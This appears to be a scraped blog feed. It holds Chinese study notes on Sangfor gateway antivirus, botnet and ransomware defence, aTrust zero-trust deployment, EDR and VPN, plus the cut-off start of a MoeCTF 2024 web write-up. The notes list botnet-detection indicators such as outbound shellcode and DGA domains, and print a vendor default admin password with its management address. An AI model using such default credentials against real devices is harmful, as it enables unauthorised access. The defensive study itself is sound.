终端上网安全网关杀毒技术"></a>4.1.13 终端上网安全网关杀毒技术</h4><ol><li><p>网关杀毒功能优势：</p><ol><li>基于应用层过滤病毒</li><li>过滤出入网关数据</li><li>网关阻断病毒传输，主动防御病毒于网络之外</li><li>部署简单，方便管理，维护成本低</li><li>与杀毒软件联动，建立多层防护</li></ol></li><li><p>实现方法</p><ol><li><p>代理扫描</p><ul><li>将所有经过网关的需要进行病毒检测的数据报文透明的转交给网关自身的协议栈，通过网关自身的协议栈将文件全部缓存下来后，再送入<strong>病毒检测引擎</strong>进行病毒检测。</li></ul></li><li><p>流扫描</p><ul><li>依赖于<strong>状态检测技术</strong>以及<strong>协议解析技术</strong>，简单的提取文件的特征与本地签名库进行匹配。</li></ul></li></ol></li></ol><p><img src="https://pic.imgdb.cn/item/66dc17ded9c307b7e9dc7b6f.png"></p><ol start="3"><li><p>杀毒优势</p><ol><li>支持各类主流协议文件传播杀毒，包括SMB v1/v2/v3协议，通过采用SAVE智能文件检测引擎(杀毒)，大幅提高恶意文件识别率</li><li>支持对邮件正文中的恶意域名、URL进行检测</li><li>提供覆盖更广的杀毒能力，支持文档类、脚本类的非PE文件检查、office宏病毒的杀毒功能</li><li>杀毒文件的大小限制可以灵活调整，界面可调整的大小限制为1-20M</li><li>支持对压缩文件的检测，且可设置层级，界面可调整的层级最多16层</li></ol></li><li><p>SAVE引擎优势</p><ol><li>基于AI技术提取稳定可靠的高层次特征，拥有强大的泛化能力，能够识别未知病毒或者已知病毒的新变种;</li><li>对勒索病毒检测效果达到业界领先，影响广泛的如WannaCry、BadRabbit、Globelmposter等勒索病毒，save均有检出新变种的案例。同时，对非勒索病毒也有较好的检出效果;</li><li>轻量级，资源占用少，隔离网环境检测能力业界领先;</li><li>云+边界设备+端联动，依托于深信服安全云脑海量的安全数据，SAVE能够持续进化，不断更新模型并提升检测能力，未知威胁能够在云端分钟级返回检测结果并全网同步，构成了深信服的安全云脑+安全网关AF/SIP/AC+终端安全EDR的整体解决方案。</li></ol></li><li><p>应用场景</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc1a7dd9c307b7e9e15d68.png"></p><p>配置思路：</p><p><img src="https://pic.imgdb.cn/item/66dc1b6bd9c307b7e9e34671.png">配置案例：</p><p><img src="https://pic.imgdb.cn/item/66dc1c40d9c307b7e9e4c630.png"></p><ol start="6"><li>注意事项</li></ol><p><img src="https://pic.imgdb.cn/item/66dc1de4d9c307b7e9e84191.png"></p><p><img src="https://pic.imgdb.cn/item/66dc1e68d9c307b7e9e8b461.png"></p><h4 id="4-1-14-僵尸网络检测和防御技术"><a href="#4-1-14-僵尸网络检测和防御技术" class="headerlink" title="4.1.14 僵尸网络检测和防御技术"></a>4.1.14 僵尸网络检测和防御技术</h4><ol><li>僵尸网络</li></ol><p>​        僵尸网络(Botnet，亦译为丧尸网络、机器人网络)是指骇客利用自己编写的分布式拒绝服务攻击程序将数万个沦陷的机器，即黑客常说的僵尸电脑或肉鸡组织成一个个控制节点用来发送伪造包或者是垃圾数据包，使预定攻击目标瘫痪并“拒绝服务”。通常蠕虫病毒也可以被利用组成僵尸网络</p><ol start="2"><li><p>防御技术思路</p><ol><li>需要一种事后检测机制用于发现和定位客户端受感染的机器，以降低客户端安全风险。同时记录的日志要求有较高的可追溯性。</li><li>感染了病毒、木马的机器，其病毒、木马试图与外部网络通信时，AF识别出该流量，并根据用户策略进行阻断和记录日志。</li></ol></li><li><p>防御技术</p><ol><li><strong>木马远控</strong>：对防护区域发出的数据及收到的请求数据都进行木马远控安全检测</li><li><strong>异常流量</strong>：包含非标准端口运行对应协议检测（**<u>例如22端口运行非ssh协议</u>**），反弹检测，启发式的dos攻击检测等手段</li></ol></li><li><p>异常流量检测</p><ol><li>通过对当前的网络层及应用层行为与安全模型进行偏离度分析，能够发现隐藏的网络异常行为，并根据行为特征确定攻击类型，发现特征匹配无法发现的攻击</li><li>外发流量异常功能是一种启发式的dos攻击检测手段，能够检测源IP不变的<strong>syn flood、icmp flood、dns flood与udp flood</strong>攻击。</li><li>外发流量异常功能的原理为:当特定协议的外发包pps超过配置的阈值时，基于5分钟左右的抓包样本检测数据包是否为单向流量、是否有正常响应内容，得出分析结论，并将发现的攻击提交日志显示。</li></ol></li><li><p>其他检测方法</p><ol><li>与僵尸网络连接是最基础的判定方式，信息来源包括:上万台在线设备收集、与google等机构合作共享</li><li>对于未知的僵尸网络(存在大量DGA生成的C&amp;C域名)，通过模拟DGA算法总结特征/总结一般正常域名的构成方式来判定未知的僵尸网络</li><li>危险的外联方式检测，如使用已知的(IRC、HFS)与僵尸网络进行通讯</li><li>使用标准端口传输非标准协议(如:在80端口中传输RDP协议)</li><li>对外发起CC攻击</li><li>对外传播恶意文件</li><li>对外发送shellcode</li><li>检测出下载恶意文件、恶意PDF等行为</li><li>检测出下载文件与后缀名不符</li><li>上下行流量不符</li></ol></li><li><p>配置思路</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc601dd9c307b7e957980b.png"></p><ol start="7"><li>配置案例</li></ol><p><img src="https://pic.imgdb.cn/item/66dc610fd9c307b7e958f870.png"></p><ol start="8"><li>误判处理方式</li></ol><p><img src="https://pic.imgdb.cn/item/66dc6183d9c307b7e959a336.png"></p><p><img src="https://pic.imgdb.cn/item/66dc61e6d9c307b7e95a2f50.png"></p><ol start="9"><li>恶意域名重定向</li></ol><ul><li>通过蜜罐技术解决内网存在DNS服务器时，用于定位内网感染僵尸网络主机的真实IP地址。</li><li>防止配置过程中忽略蜜罐设置，导致后续无法溯源的问题，策略配置界面新增DNS服务器服务界面。</li></ul><h4 id="4-1-15-终端安全防护专题-勒索病毒防护"><a href="#4-1-15-终端安全防护专题-勒索病毒防护" class="headerlink" title="4.1.15 终端安全防护专题-勒索病毒防护"></a>4.1.15 终端安全防护专题-勒索病毒防护</h4><ol><li>勒索攻击感染过程分析</li></ol><p>​首先，黑客通过SMB、RDP等口令暴力破解、勒索常用端口利用、以及服务器漏洞等的利用想方设法让勒索病毒感染用户主机(感染主机)<br>​当主机感染了勒索病毒文件之后，会在主机上运行勒索程序，同时黑客也会尝试利用SMB、RDP手动进行横向传播，感染更多的主机(横向扩散)<br>​接着，当勒索程序在一台或者多台主机上被运行后，勒索病毒会遍历本地所有磁盘，对指定类型的文件进行加密，加密后的文件无法再被读取(加密文件)<br>​生成勒索通知文件，告知受害者这台机器已经中了勒索病毒了，并要求受害者在规定时间内支付一定价值的比特币才能恢复数据，否则数据会被销毁(生成勒索通知勒索用户)<br>​加密后数据正常无法自己解密，因为勒索采用的是高强度非对称加密方式，受害者在没有私钥情况下无法恢复文件(交赎金恢复数据文件)</p><ol start="2"><li>感染过程流程示例</li></ol><p><img src="https://pic.imgdb.cn/item/66dc6598d9c307b7e95f8e8c.png"></p><ol start="3"><li><p>勒索病毒防护</p><ol><li><p>事前防御</p><ul><li>勒索常用端口主动扫描</li><li>服务器高危漏洞主动扫描</li><li>**<u>RDP/VNC/SSH/SMB</u>**服务弱口令主动扫描</li></ul></li><li><p>事中对抗</p><ul><li>自动生成全面勒索防护的安全策略</li><li>不需再手动单独配置多类防护策略</li></ul></li><li><p>事后响应</p><ul><li>联动EDR查杀</li><li>勒索事件可视易懂</li><li>一键隔离失陷资产</li></ul></li></ol></li><li><p>功能介绍</p><ol><li><p>事前防御</p><ul><li><p>梳理资产暴露面，屏蔽勒索入侵进入点，对勒索常用端口、勒索常用漏洞、弱口令做事前的识别，并给出处理建议</p><p>  <img src="https://pic.imgdb.cn/item/66dc6987d9c307b7e96528e2.png"></p></li></ul></li><li><p>事中对抗</p><ul><li>勒索专项防护策略自动生成，全面防护勒索黑客攻击。通过安全策略深度检测入侵手段对抗隐蔽勒索攻击，通过自动生成web应用防护、漏洞防护、内容安全、慢速爆破检测的全面防护策略对勒索病毒做全面入侵防御</li></ul></li><li><p>事后响应</p><ul><li><p>联动EDR查杀，隔离失陷资产，快速处置勒索风险，勒索事件可视、易分析</p><p>  <img src="https://pic.imgdb.cn/item/66dc6b83d9c307b7e9696a30.png"></p></li></ul></li></ol></li><li><p>配置思路</p></li></ol><p><img src="https://pic.imgdb.cn/item/66dc6c0dd9c307b7e96b0438.png"></p><ol start="6"><li>配置勒索防护配置</li></ol><ul><li>勒索专项防护的主动扫描，目前仅支持对RDP/VNC/SSH/SMB服务的弱口令扫描并分析受保护的服务器是否存在已知漏洞</li><li>支持SMB慢速爆破、分布式慢速爆破检测，支持RDP慢速爆破检测;</li><li>可支持将SMB/RDP慢速爆破的日志同步到SIP平台</li></ul><h3 id="第二部分-全网行为管理基础原理与运维"><a href="#第二部分-全网行为管理基础原理与运维" class="headerlink" title="第二部分 全网行为管理基础原理与运维"></a>第二部分 全网行为管理基础原理与运维</h3><h3 id="第三部分-零信任基础原理与运维"><a href="#第三部分-零信任基础原理与运维" class="headerlink" title="第三部分 零信任基础原理与运维"></a>第三部分 零信任基础原理与运维</h3><blockquote><p>aTrust是一款基于区块链技术的信任管理平台，主要用于数字身份管理和数据安全。它通过去中心化的方式，提供安全、透明和可追溯的身份验证和数据共享服务。</p></blockquote><h4 id="4-3-1-aTrust设备部署实施上架"><a href="#4-3-1-aTrust设备部署实施上架" class="headerlink" title="4.3.1 aTrust设备部署实施上架"></a>4.3.1 aTrust设备部署实施上架</h4><ol><li>硬件环境</li></ol><ul><li>零信任aTrust分为“<strong>分离式部署</strong>”和“<strong>综合网关部署</strong>”两种形式。</li><li>代理网关设备、控制中心设备、综合网关设备外观基本相同(网口数有差异)，主要是设备上的型号差异。</li><li>控制中心型号以C结尾，如aTrust-1000-B1080C;</li><li>代理网关的型号以G结尾，如aTrust-1000-B1060G;</li><li>综合网关型号以M结尾，如aTrust-1000-V1050M。</li></ul><p>​aTrust设备，控制中心和安全代理网关的默认的出厂IP均为MANAGE(ETHO):10.254.254.254/24。如果电脑连接的是aTrust设备控制中心或安全代理网关的MANAGE(ETH0)口，需要先在电脑上配置一个10.254.254.0/24网段的地址，打开浏览器输入<a href="https://10.254.254.254:**4433">https://10.254.254.254:**4433</a>** 登录设备网关控制台。控制中心或安全代理网关控制台管理端口是4433，默认用户名admin密码SangforSDP@1220</p><ol start="2"><li>软件环境</li></ol><ul><li>支持虚拟化部署，支持平台有:<ol><li>深信服超融合平台(HCIV5.8.6及以上)</li><li>VMware5.0及以上，使用KVM虚拟化技术，支持qcow2格式导入的虚拟化环境</li><li>各种常见公有云平台，如阿里云、腾讯云、华为云、</li></ol></li><li>服务器配置参数要求</li></ul><p><img src="https://pic.imgdb.cn/item/66dc703bd9c307b7e975ecd8.png"></p><ol start="3"><li><p>安装–HCI平台镜像部署</p><p> 1. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc715bd9c307b7e9776ff9.png)</code></pre><p> 2. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc71a8d9c307b7e977db66.png)</code></pre><p> 3. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc71cfd9c307b7e97810f3.png)</code></pre><p> 4. </p><pre><code> ![](https://pic.imgdb.cn/item/66dc71eed9c307b7e978420c.png)</code></pre><ol start="5"><li><p>网络部署–后台配置临时网络</p><p> <img src="https://pic.imgdb.cn/item/66dc722cd9c307b7e9789fab.png"></p></li><li><p>网络部署–web平台配置网络</p><p> <img src="https://pic.imgdb.cn/item/66dc72e6d9c307b7e979afed.png"></p></li></ol></li></ol><p><img src="https://pic.imgdb.cn/item/66dc731cd9c307b7e979fe31.png"></p><p><img src="https://pic.imgdb.cn/item/66dc738fd9c307b7e97aa3cc.png"></p><p><img src="https://pic.imgdb.cn/item/66dc73bbd9c307b7e97ae03a.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7438d9c307b7e97b9d20.png"></p><p><img src="https://pic.imgdb.cn/item/66dc745dd9c307b7e97bcfce.png"></p><ol start="4"><li>控制中心和代理网关联动</li></ol><p><img src="https://pic.imgdb.cn/item/66dc74cdd9c307b7e97c698c.png"></p><p><img src="https://pic.imgdb.cn/item/66dc74fbd9c307b7e97caaf0.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7530d9c307b7e97cfdb0.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7566d9c307b7e97d4aa6.png"></p><p><img src="https://pic.imgdb.cn/item/66dc7579d9c307b7e97d6788.png"></p><p><img src="https://pic.imgdb.cn/item/66dc75b3d9c307b7e97db541.png"></p><ol start="5"><li>aTrust用户访问和客户端下载</li></ol><p></p><h4 id="4-3-2-aTrust本地集群部署"><a href="#4-3-2-aTrust本地集群部署" class="headerlink" title="4.3.2 aTrust本地集群部署"></a>4.3.2 aTrust本地集群部署</h4><ol><li>本地集群部署使用背景</li></ol><p>​本地集群部署主要是为解决设备高可用问题，为客户**<u>提供设备容灾</u>和<u>扩容</u>的能力**。实现单节点设备出现故障时，集群模块能进行容灾处理，不中断业务的效果</p><p>控制中心(SDPC)集群目前主要提供两部分的能力:</p><ul><li>高可用性:集群中的一个节点失效，业务可转移给另一个节点，不中断业务。</li><li>高性能:集群采用负载均衡技术，实现接更多用户的接入，业务响应速度更快。</li></ul><p>代理网关(Proxy)集群目前主要提供两部分的能力:</p><ul><li><p>高可用性:集群中的一个节点失效，业务可转移给另一个节点，不中断业务。</p></li><li><p>高性能:集群采用负载均衡技术，实现更多的接入资源访问。</p></li><li><p>零信任aTrust，控制中心SDPC、代理网关Proxy和二合一综合网关组建主从集群时，支持集群数量为2~4台进行组建。</p></li><li><p>其中控制中心sdpc和二合一集群添加节点时，可以选择节点的角色，分为<strong>从节点</strong>和<strong>工作节点</strong>，从节点数量要<br>  求至少有一个，至多有四个;</p></li><li><p>代理网关proxy集群分为<strong>集群主从模式</strong>、<strong>双机热备式</strong>。</p></li><li><p>主从模式下的集群扩展支持1主+1从+2工作、1主+2从+1等工作模式，但不支持1主+3从，在此模式下性能难<br>  以满足。</p></li><li><p>设备版本低于 2.1.17 时，必须要拆除集群和 proxy 分别升级;当版本为 2.1.17及之后 的版本时，可以在不<br>  拆除集群和 proxy的场景下，进行设备升级。。</p></li></ul><blockquote><p>注:从节点与工作节点区别:</p><ul><li>从节点具备灾备和工作负载两种作用，在主节点出现故障后，从节点会自动切换为主节点(如有两个从节点，则随机进行切换);而工作节点仅具备工作负载作用。</li><li>从节点需要实时和主节点进行数据同步，工作节点仅在每天凌晨进行数据同步。因此从节点在设备运行时对主节点性能消耗更高。</li></ul></blockquote><ol start="2"><li>本地集群部署配置指导</li></ol><p><img src="https://pic.imgdb.cn/item/66dd1642d9c307b7e960e013.png"></p><ol start="3"><li><p>集群部署配置案例–组建代理网关集群，并与控制中心联动</p></li><li><p>注意事项</p></li></ol><ul><li>Proxy集群由于是采用的<strong>DR模式</strong>（直接转发），要求Proxy集群节点只能是在同一局域网，<u>不能跨局域网之间的节点进行组建</u></li><li>两台sdpc（控制中心）或proxy设备CPU核数(可以在console页面查看)、内存大小、网口数需均一致</li><li>软件版本、授权类型(分基础版和增强版)必须一致</li><li>硬件和虚拟化软件设备、不同虚拟化环境上的虚拟机不能组集群</li><li>主线版本一致，但一台打了定制包或补丁包的，另一台没有，不建议组集群</li><li>设备版本低于 2.1.17时，升级必须要拆除集群;当版本为 2.1.17及之后 的版本时，可以在不拆除集群的场<br>  景下，进行设备升级。</li><li>当前集群状态下，不支持配置导入，需要拆集群后再导入配置</li><li>SDPC集群会同步配置信息，Proxy集群不同步配置信息</li></ul><h4 id="4-3-3-aTrust用户管理"><a href="#4-3-3-aTrust用户管理" class="headerlink" title="4.3.3 aTrust用户管理"></a>4.3.3 aTrust用户管理</h4><p>​用户管理，用于提供用户认证登录的用户源，管理各个认证服务器的用户和组织信息。可实现用户/组织的新增、删除、编辑，实现用户、组织架构、角色的精细化授权，和策略绑定(包括认证策略和用户策略)</p><p>aTrust用户目录，主要有两种来源，分别是外部和本地<br>（1）本地</p><ul><li>本地用户目录<ul><li>本地用户目录是aTrust设备内置的数据库用户目录管理，当客户没有第三方用户服务器时，可使用本地用户目录进行管理。</li></ul></li><li>自定义本地用户目录<ul><li>客户使用的是第三方的认证服务器，但第三方认证服务器没有提供LDAP/AD或企业微信等用户源设备导入至aTrust本地。此时我们可使用自定义本地用户目录，将第三方的用户信息批量导入aTrust本地。</li></ul></li></ul><p>（2）外部</p><ul><li>微软MS ActiveDirectory、Open LDAP、Sangfor IDTrust LDAP</li><li>企业微信</li><li>钉钉</li></ul><ol><li>用户目录管理–本地用户</li></ol><p><img src="https://pic.imgdb.cn/item/66dd6242d9c307b7e9db12e0.png"></p><p>​用户源选择本地时，用户的账号和密码信息是保存在<strong>aTrust的数据库</strong>内。本地用户目录aTrust支持如下功能。</p><ul><li>新增组织架构，角色和用户</li><li>用户的批量导入和导出功能</li><li>精细化授权，可通过组织架构，角色和用户针对性的进行应用授权</li></ul><ol start="2"><li>用户目录管理–外部用户</li></ol><p>​外部用户可实现同步至aTrust设备本地，实现如下功能:</p><ul><li>精细化授权，可通过组织架构，角色和用户针对性的进行应用授权</li><li>LDAP（**<u>轻量级目录访问协议</u><strong>）/AD（</strong><u>活动目录</u>**）用户目录，支持立即同步和定时自动同步用户信息，支持导入安全组</li><li>企业微信用户目录，支持立即同步和定时自动同步用户信息功能</li></ul><ol start="3"><li>用户管理功能指导–本地用户、自定义本地用户</li></ol><ul><li>所有的预置条件都是：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)</li></ul><ol start="4"><li>用户管理功能指导–LDAP/AD域用户</li></ol><ul><li>预置条件：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)；控制中心(综合网关)设备与LDAP/AD认证服务器通信正常</li></ul><ol start="5"><li>用户管理功能指导–企业微信用户</li></ol><ul><li>预置条件：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)；控制中心(综合网关)设备与企业微信通信正常，同时获取了企业微信的CorpID和通讯录Secret信息</li></ul><ol start="6"><li>用户管理功能指导–钉钉用户</li></ol><ul><li>预置条件：aTrust控制器SDPC和代理网关Proxy已安装联动(或已完成综合网关的安装)；控制中心(综合网关)设备与钉钉通信正常，同时获取了认证应用的AppKey和AppSecret信息</li></ul><h4 id="4-3-4-aTrust本地认证"><a href="#4-3-4-aTrust本地认证" class="headerlink" title="4.3.4 aTrust本地认证"></a>4.3.4 aTrust本地认证</h4><h4 id="4-3-5-aTrust-LDAP认证"><a href="#4-3-5-aTrust-LDAP认证" class="headerlink" title="4.3.5 aTrust_LDAP认证"></a>4.3.5 aTrust_LDAP认证</h4><h4 id="4-3-6-aTrust-TOTP动态令牌认证"><a href="#4-3-6-aTrust-TOTP动态令牌认证" class="headerlink" title="4.3.6 aTrust_TOTP动态令牌认证"></a>4.3.6 aTrust_TOTP动态令牌认证</h4><h4 id="4-3-7-aTrust证书认证"><a href="#4-3-7-aTrust证书认证" class="headerlink" title="4.3.7 aTrust证书认证"></a>4.3.7 aTrust证书认证</h4><h4 id="4-3-8-aTrust腾讯云阿里云短信认证"><a href="#4-3-8-aTrust腾讯云阿里云短信认证" class="headerlink" title="4.3.8 aTrust腾讯云阿里云短信认证"></a>4.3.8 aTrust腾讯云阿里云短信认证</h4><h4 id="4-3-9-aTrust自定义HTTP-S-短信认证"><a href="#4-3-9-aTrust自定义HTTP-S-短信认证" class="headerlink" title="4.3.9 aTrust自定义HTTP(S)短信认证"></a>4.3.9 aTrust自定义HTTP(S)短信认证</h4><h4 id="4-3-10-aTrust-Radius账号认证"><a href="#4-3-10-aTrust-Radius账号认证" class="headerlink" title="4.3.10 aTrust_Radius账号认证"></a>4.3.10 aTrust_Radius账号认证</h4><h3 id="第四部分-终端安全原理与运维"><a href="#第四部分-终端安全原理与运维" class="headerlink" title="第四部分 终端安全原理与运维"></a>第四部分 终端安全原理与运维</h3><h4 id="4-4-1-EDR安装部署"><a href="#4-4-1-EDR安装部署" class="headerlink" title="4.4.1 EDR安装部署"></a>4.4.1 EDR安装部署</h4><p>EDR（终端安全检测响应系统）</p><ol><li>总体架构</li></ol><p>​EDR从系统架构上分为三层，基础平台层、核心引擎层以及功能展现层</p><ul><li>基础平台层:负责提供集中管控，云查以及主机代理功能的基础能力。</li><li>核心引擎层:负责提供病毒检测，威胁分析以及行为检测等能力。</li><li>功能展现层:从预防、防御、检测、响应等四个方面，提供全面的安全防护体系。</li></ul><p><img src="https://pic.imgdb.cn/item/66dd7225d9c307b7e9f506eb.png"></p><ol start="2"><li>部署结构</li></ol><p>​EDR从部署结构上分为云端、管理端(MGR)和客户端(Agent)三部分。</p><ul><li>云端:包括病毒库升级、云端查杀服务中心、安全情报中心。</li><li>管理端:负责维护管理所有的Agent客户端。</li><li>客户端:安装在终端的软件，对终端进行安全防护，</li></ul><img src="https://pic.imgdb.cn/item/66dd72f2d9c307b7e9f5e061.png" style="zoom: 67%;"><ol start="3"><li><p>MGR(管理端)部署</p><ul><li><p>兼容性确认</p></li><li><p>硬件要求确认</p></li><li><p>网络连通性确认</p><ul><li>客户端(Agent)与管理平台(MGR)通信使用到TCP:4430、TCP:8083、TCP:54120端口、ICMP。确保端口连通性。<ul><li>4430端口:Agent组件更新和病毒库更新。</li><li>8083端口:Agent和管理端业务通信端口。</li><li>54120端口:逃生端口，应急情况与Agent通信端口。完成Agent重启、卸载和脚本执行命令下发。</li><li>ICMP:连通性探测</li></ul></li></ul></li></ul><ol><li><p>软件部署</p><ul><li>ISO镜像部署</li></ul><p> <img src="https://pic.imgdb.cn/item/66dd7eead9c307b7e90a79e4.png"></p><ul><li>OVA模板部署</li></ul></li><li><p>硬件一体机部署</p></li></ol><p> <img src="https://pic.imgdb.cn/item/66dd7ff2d9c307b7e90b99a6.png"></p></li><li><p>客户端Agent部署</p></li></ol><ul><li>部署方式(5种):安装包部署、网页推广部署、AC联动部署、虚拟机模板部署、域控场景部署</li></ul><p><img src="https://pic.imgdb.cn/item/66dd90ddd9c307b7e926d6f9.png"></p><h4 id="4-4-2-EDR终端管理"><a href="#4-4-2-EDR终端管理" class="headerlink" title="4.4.2 EDR终端管理"></a>4.4.2 EDR终端管理</h4><ol><li>终端管理–需求背景</li></ol><p>​内网电脑数量多，不同部门电脑系统版本不一样、不同终端类型需要配置的安全策略也不一样，管理员缺少一种对全网电脑进行管理的方式、给运维带来不便。</p><p>​EDR终端分组是<strong>树形组织结构</strong>，能根据客户不同需求对终端进行灵活分组，如按<strong>业务部门</strong>、按<strong>终端类型</strong>(客户端和服务器)等进行分组，并且可以对各个分组配置个性化的安全策略，从而做到内网众多电脑进行分类管理、方便运维。</p><ol start="2"><li>终端清点–需求背景</li></ol><p>​终端清点功能能够帮助管理员看清全网主机资产全貌，理清全网主机风险暴露面，从而削减全网主机攻击面。</p><p>​终端清点是由EDR客户端读取<strong>终端操作系统信息</strong>、<strong>已安装的应用软件信息</strong>、<strong>开放的监听端口信息</strong>、<strong>终端的系统账户信息和终端硬件信息</strong>，上报给EDR管理平台进行集中展示和分析</p><p><img src="https://pic.imgdb.cn/item/66dd95b1d9c307b7e93439e1.png"></p><p>应用场景：</p><p>（1）全网非授权软件使用统计</p><p>（2）全网主机风险账户梳理</p><p>（3）统一封堵风险端口</p><ol start="3"><li>终端发现–需求背景</li></ol><p>​终端电脑数量很多的情况下，管理员很难知道哪些终端未安装EDR客户端进行防护，从而带来潜在的安全风险。终端发现功能可以帮助管理员发现内网没有安装EDR客户端的电脑，及时做好安全防护，降低风险暴露面。</p><p>原理：</p><p>​EDR集成了Nmap扫描工具实现终端发现功能。管理员触发内网扫描(Nmap扫描)对内网终端进行活跃探测，扫描返回结果中的IP说明主机是活跃的，EDR将活跃的主机IP和EDR管理平台中在线的终端IP比较，得出EDR管理平台中不存在的活跃主机，即为未安装EDR客户端的终端。</p><ol start="4"><li>终端基线检查–需求背景</li></ol><p>​信息安全等级保护标准已经成为国内企业信息安全建设的标准。国家规定，有些行业(如金融、教育、能源、电商等)是有要求自己的信息安全建设过等保测评的。等保从物理安全、网络安全、主机安全、应用安全、数据安全、安全管理等方面对信息安全建设都做了相应的规范要求。<br>​如果客户业务系统需要准备等保测评，那么业务系统当前安全状态与等保安全要求之间的差距在哪里，需要帮助客户梳理出来，进行整改。EDR的基线检查功能是根据三级等保合规性要求对windows和linux系统进行合规性检查，帮助客户发现内网不合规终端及不合规项并提供加固整改建议。</p><p>功能:</p><p>对以下安全策略进行合规性检查</p><ul><li>身份鉴别策略组检测</li><li>访问控制策略组检测</li><li>安全审计策略组检测</li><li>剩余信息保护策略组检测</li><li>入侵防范检测</li></ul><p><img src="https://pic.imgdb.cn/item/66dd9a6cd9c307b7e93ad4a9.png"></p><ol start="5"><li>远程协助</li></ol><p>原理:</p><p>​基于远程控制开源软件UItraVNC(分为客户端和服务端)，EDR客户端默认附带UItraVNC服务端程序。通过在EDR管理平台发起远程，下载运行UItraVNC客户端程序，输入被远程端的IP、端口以及授权码即可实现远程控制。</p><p>注意事项:</p><p><img src="https://pic.imgdb.cn/item/66dd9c20d9c307b7e93d216a.png"></p><h4 id="4-4-3-EDR策略中心"><a href="#4-4-3-EDR策略中心" class="headerlink" title="4.4.3 EDR策略中心"></a>4.4.3 EDR策略中心</h4><h4 id="4-4-4-EDR微隔离"><a href="#4-4-4-EDR微隔离" class="headerlink" title="4.4.4 EDR微隔离"></a>4.4.4 EDR微隔离</h4><h3 id="第五部分-广域网组网与传输安全"><a href="#第五部分-广域网组网与传输安全" class="headerlink" title="第五部分 广域网组网与传输安全"></a>第五部分 广域网组网与传输安全</h3><h4 id="4-5-1-VPN概述"><a href="#4-5-1-VPN概述" class="headerlink" title="4.5.1 VPN概述"></a>4.5.1 VPN概述</h4><ol><li>VPN需求背景</li></ol><ul><li>企业、组织、商家等对专用网有强大的需求。</li><li>高性能、高速度和高安全性是专用网明显的优势</li><li>物理专用网价格高昂，物理架设实施有难度。传统的通过租用专线或拨号网络的方式越来越不适用。(性价比较低)</li><li>TCP/IP 协议簇本身的局限性，不能保证信息直接传输的保密性。TCP/IP协议在设计之初是基于可信环境的，没有考虑安全问题，所以在TCP/IP协议簇本身存在许多固有的安全缺陷。</li></ul><p>总结两点：对专用网的需求增加、物理专用网架设性价比低</p><ol start="2"><li>VPN概述</li></ol><p>​VPN定义(VitualPrivate Network，虚拟私有网):是指依靠ISP或其他NSP在公用网络基础设施之上构建的专用的安全数据通信网络，只不过这个专线网络是逻辑上的而不是物理的，所以称为虚拟专用网。</p><p>虚拟：用户不再需要拥有实际的长途数据线路，而是使用公共网络资源建立自己<br>的私有网络。</p><p>专用：用户可以定制最符合自身需求的网络。</p><p>核心技术：隧道技术</p><ol start="3"><li><p>VPN分类</p><ol><li>按业务分类</li></ol><p> （1）Client-LAN VPN（Access VPN）</p><ul><li>使用基于Internet远程访问的 VPN</li><li>出差在外的员工、有远程办公需要的分支机构，都可以利用这种类型的VPN，实现对<br>  企业内部网络资源进行安全地远程访问。</li></ul><p> <img src="https://pic.imgdb.cn/item/66e05f68d9c307b7e97da0e9.png"></p><p> （2）LAN-LAN VPN</p><ul><li>为了在不同局域网络之间建立安全的数据传输通道，例如在企业内部各分支机构之间或者企业与其合作者之间的网络进行互联，则可以采用LAN-LAN 类型的VPN。</li></ul><p> <img src="https://pic.imgdb.cn/item/66e06010d9c307b7e980247e.png"></p><ol start="2"><li>按网络层次分类</li></ol><p> <img src="https://pic.imgdb.cn/item/66e06094d9c307b7e982080b.png"></p></li><li><p>VPN常用技术</p></li></ol><h3 id="第六部分-态势感知基础原理与运维"><a href="#第六部分-态势感知基础原理与运维" class="headerlink" title="第六部分 态势感知基础原理与运维"></a>第六部分 态势感知基础原理与运维</h3>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深信服 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF 2024 Web渗透测试与审计</title>
      <link href="/2024/08/12/moectf-2024-web-shen-tou-ce-shi-yu-shen-ji/"/>
      <url>/2024/08/12/moectf-2024-web-shen-tou-ce-shi-yu-shen-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="MoeCTF-2024–Web渗透测试与审计"><a href="#MoeCTF-2024–Web渗透测试与审计" class="headerlink" title="MoeCTF 2024–Web渗透测试与审计"></a>MoeCTF 2024–Web渗透测试与审计</h1><h2 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h2><h3 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h3><p>下载附件，附件提示，搭个php网站访问即可获得flag（本地搭一个就行）</p><p>整体说一下思路吧，首先得有一个phpstudy，将页面文件放到apache服务的访问页面的默认目录，开启apache服务，直接127.0.0.1访问对应网页文件就可以，现在来操作一遍吧！</p><ol><li>配置网站目录，将页面文件放到网站目录下</li></ol><p><img src="https://pic.imgdb.cn/item/66b9ef29d9c307b7e913a5a5.png"></p><ol start="2"><li>开启服务</li></ol><p><img src="https://pic.imgdb.cn/item/66b9ef6bd9c307b7e913e1e3.png"></p><ol start="3"><li>访问页面，得到flag</li></ol><p><img src="https://pic.imgdb.cn/item/66b9ef9fd9c307b7e9140fff.png"></p><h3 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h3><p>打开之后，是这样的，他提到要用爬虫，那么大概率就是要爬取网页的目录以及文件</p><p><img src="https://pic.imgdb.cn/item/66b9f0c7d9c307b7e9154be1.png"></p><p>那么我们就开始爬虫，我打算用burpsuite来进行，开启代理，burpsuie抓包</p><img src="https://pic.imgdb.cn/item/66b9f378d9c307b7e9184c26.png" style="zoom:67%;"><p>进行扫描</p><img 